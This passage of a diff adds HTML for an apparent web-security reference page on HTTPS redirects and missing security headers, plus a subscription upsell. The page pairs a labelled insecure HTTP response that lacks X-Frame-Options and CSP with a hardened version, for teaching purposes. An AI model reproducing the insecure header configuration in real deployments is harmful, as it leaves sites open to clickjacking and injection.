+            <div class="code-sandbox-header remediated"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg> REMEDIATED PRODUCTION CODE (HTTP Header)</div>
+            <pre><code>HTTP/1.1 301 Moved Permanently
+Location: https://example.com/
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+
+# SECURE: Forces immediate redirect to TLS and locks the browser to HTTPS.</code></pre>
+          </div>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-emerald)" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg> Perimeter Identification Vector</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Agent connects via plain HTTP and traces the redirect chain, validating the cryptographic upgrade and HSTS header presence.</p>
+        </div>
+      </section>
+
+      <!-- VULNERABILITY 08 -->
+      <section id="vuln-08" style="scroll-margin-top: 100px; padding-top: 2rem; padding-bottom: 2rem;">
+        <div class="catalog-header">
+          <h1>Passive Compliance Headers</h1>
+          <p>Reference Guide 08 • Browser Engine Protection Directives</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-blue)" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg> Technical Synopsis & Mechanism</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Missing security headers like X-Frame-Options and Content-Security-Policy leave the UI vulnerable to clickjacking and data injection.</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-amber)" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg> Real-World Risk Vector</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Attackers can embed your site in an invisible iframe to trick users into executing destructive actions (Clickjacking), or bypass input sanitization entirely via DOM injection.</p>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg> Code Sandbox Environments</h2>
+          <div class="code-sandbox" style="margin-bottom: 2rem;">
+            <div class="code-sandbox-header insecure"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg> INSECURE CODE SAMPLE (HTTP Header)</div>
+            <pre><code>HTTP/1.1 200 OK
+Content-Type: text/html
+
+# DANGEROUS: UI can be framed by any domain.</code></pre>
+          </div>
+          <div class="code-sandbox">
+            <div class="code-sandbox-header remediated"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg> REMEDIATED PRODUCTION CODE (HTTP Header)</div>
+            <pre><code>HTTP/1.1 200 OK
+X-Frame-Options: DENY
+Content-Security-Policy: default-src 'self'
+
+# SECURE: Strict framing denial and strict content execution policies.</code></pre>
+          </div>
+        </div>
+        <div class="content-card">
+          <h2><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-emerald)" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg> Perimeter Identification Vector</h2>
+          <p style="color: var(--text-muted); line-height: 1.6;">Agent passively analyzes the raw HTTP response headers against a strict 12-point compliance matrix.</p>
+        </div>
+      </section>
+
+      <!-- Monetization Upsell Banner -->
+      <div class="upsell-banner">
+        <div class="upsell-text">
+          <div style="display:flex; align-items:center; gap:8px; margin-bottom:8px;">
+            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="var(--brand-blue)" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+            <strong>Are your live production servers currently exposing these architecture flaws?</strong>
+          </div>
+          Don't guess. Run an automated, multi-layered passive and active DAST audit sweep against your public web infrastructure now.
+        </div>
+        <div class="upsell-actions">
+          <a href="index.html" class="btn btn-primary" style="display:flex; align-items:center; gap:8px;">
+            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            Execute Automated Perimeter Audit
+          </a>
+          <a href="pricing.html" class="btn btn-emerald" style="display:flex; align-items:center; gap:8px;">
+            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
+            Go Professional Pro - $29/mo
+          </a>
+        </div>
+      </div>
+
+    </main>
+  </div>
+</body>
+</html>
